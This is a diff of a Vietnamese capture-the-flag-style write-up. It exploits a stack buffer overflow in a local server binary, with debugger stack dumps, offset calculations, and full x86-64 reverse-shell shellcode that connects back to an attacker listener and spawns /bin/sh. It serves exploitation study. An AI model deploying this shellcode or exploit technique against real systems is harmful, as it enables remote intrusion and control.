@@ -218,10 +218,10 @@ ___
 * overflow và overwrite RIP với địa chỉ buffer tính được
 
 Thấy trên stack của ./server, có tồn tại địa chỉ stack, libc:
-```
+```asm
 0x7fffffffda60: buffer
 ...
-0x7fffffffdaa0 —▸ 0x7fffffffdbf0: địa chỉ stack 
+0x7fffffffdaa0 —▸ 0x7fffffffdbf0: địa chỉ trên stack 
 0x7fffffffdaa8 —▸ 0x7ffff7e02290 (__printf_buffer_to_file_done+16): libc
 0x7fffffffdab0 —▸ 0x7ffff7f905c0 (_IO_2_1_stdout_)
 0x7fffffffdab8 —▸ 0x7ffff7e0cf99 (__vfprintf_internal+553): libc           
@@ -229,11 +229,97 @@ Thấy trên stack của ./server, có tồn tại địa chỉ stack, libc:
 <img width="820" height="572" alt="image" src="https://github.com/user-attachments/assets/91a32c23-070c-4e87-abee-9ac8a0f0f92a" />
 
 <img width="807" height="276" alt="image" src="https://github.com/user-attachments/assets/659023d4-142e-47cc-bff5-ac9501734244" />
+
 Dùng địa chỉ stack tính offset đến buffer:
-```
+
+```asm
 pwndbg> p/x 0x7fffffffdbf0 - 0x7fffffffda60
 $1 = 0x190
 ```
+<img width="821" height="68" alt="image" src="https://github.com/user-attachments/assets/41133c7b-ff42-472f-b713-ae45f9813812" />
+
+
+Tạo payload với shellcode:
+* kết nối về máy attacker qua socket
+* chuyển các streams về máy attacker
+* tạo shell
+
+```asm
+shellcode = asm("""
+		mov rax, 41
+		mov rdi, 2
+		mov rsi, 1
+		mov rdx, 0
+		syscall
+
+		mov rbx, rax
+
+		mov rdx, 0x0100007f
+		push rdx
+		mov dx, 0x5c11
+		push dx
+		mov dx, 2 
+		push dx
+
+		mov rax, 42
+		mov rdi, rbx 
+		mov rsi, rsp 
+		mov rdx, 16  
+		syscall
+
+		mov rax, 33
+		mov rdi, rbx
+		mov rsi, 0
+		syscall
+
+		mov rax, 33
+		mov rdi, rbx
+		mov rsi, 1
+		syscall
+
+		mov rax, 33
+		mov rdi, rbx
+		mov rsi, 2
+		syscall
+
+		mov rbx, 0x68732f6e69622f
+		push rbx
+
+		mov rax, 59
+		mov rdi, rsp
+		mov rsi, 0
+		mov rdx, 0
+		syscall
+	""")
+```
+Bên cạnh đấy, padding payload cho đến RIP và overwrite với địa chỉ buffer tính được lúc nãy. Để khi chương trình thoát, RIP sẽ di chuyển đến buffer và thực thi shellcode ở đấy.
+```
+offset = RIP - buffer_addr
+       = 616 (512 + 104)
+```
+
+Chọn option `read` để đẩy payload vào
+
+Và trên stack bên server sẽ như sau:
+
+<img width="804" height="598" alt="image" src="https://github.com/user-attachments/assets/ec2170c9-bda2-457a-ae3c-4970a74c314c" />
+
+<img width="816" height="349" alt="image" src="https://github.com/user-attachments/assets/33833623-0401-4049-bbdd-4d2954aa2404" />
+
+Giờ để RIP trỏ tới buffer đang chứa shellcode, ta  phải kích hoạt được:
+```
+    rd = read(fd,option,80);
+    if (rd == 0) break;
+```
+bằng cách thoát chương trình, có thể dùng:
+```
+# dong ket noi de ham RET -> rip tro den shellcode
+p.shutdown("send") 
+```
+
+và ta được shell:
+
+<img width="811" height="244" alt="image" src="https://github.com/user-attachments/assets/ec0405bd-3f74-4f0b-9e90-de49006d781a" />
 
 
 script:
